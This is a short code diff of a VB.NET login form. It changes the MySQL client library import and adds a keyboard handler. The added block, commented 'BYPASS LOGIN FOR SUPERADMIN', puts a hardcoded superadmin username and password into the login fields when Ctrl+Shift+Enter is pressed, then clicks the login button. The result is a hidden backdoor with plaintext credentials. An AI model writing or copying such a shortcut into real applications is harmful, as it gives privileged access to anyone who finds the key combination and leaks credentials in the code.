@@ -1,5 +1,5 @@
 ﻿Imports DevExpress.XtraSplashScreen
-Imports MySql.Data.MySqlClient
+Imports MySqlConnector
 
 Public Class frm_login
 
@@ -124,6 +124,13 @@ Public Class frm_login
         'SHOW DEVELOPER
         If e.Modifiers = Keys.Shift And e.KeyCode = Keys.Z Then
             MsgBox("Developed by John Zenery", vbInformation, "Who is my Creator")
+        End If
+
+        'BYPASS LOGIN FOR SUPERADMIN
+        If e.Shift And e.Control And e.KeyCode = Keys.Enter Then
+            txt_username.Text = "zen"
+            txt_password.Text = "@asd"
+            btn_login.PerformClick()
         End If
 
         'Show Password dialog and ZERP Connection Panel
